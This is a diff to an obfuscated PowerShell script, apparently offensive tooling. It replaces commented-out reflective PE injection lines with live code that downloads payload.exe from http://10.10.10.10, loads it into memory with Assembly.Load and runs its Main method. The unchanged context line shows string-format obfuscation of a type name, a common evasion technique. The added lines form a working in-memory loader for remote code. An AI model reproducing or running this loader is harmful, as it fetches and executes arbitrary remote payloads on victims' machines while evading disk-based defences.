@@ -91,10 +91,9 @@ SET  ("{0}{1}"-f'2qF','xA')  ( [tyPe]("{5}{3}{6}{2}{7}{9}{4}{11}{1}{0}{8}{10}" -
 
 
 
- #反射
+ #powershell反射式加载
 
 
-#IEX (New-Object Net.WebClient).DownloadString("http://192.168.92.129:8000/CodeExecution/Invoke-ReflectivePEInjection.ps1")
-#$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.92.129/1.exe')
-#$procid = (Get-Process -Name notepad).Id
-#Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[TotallyNotMal.Program]::Main()
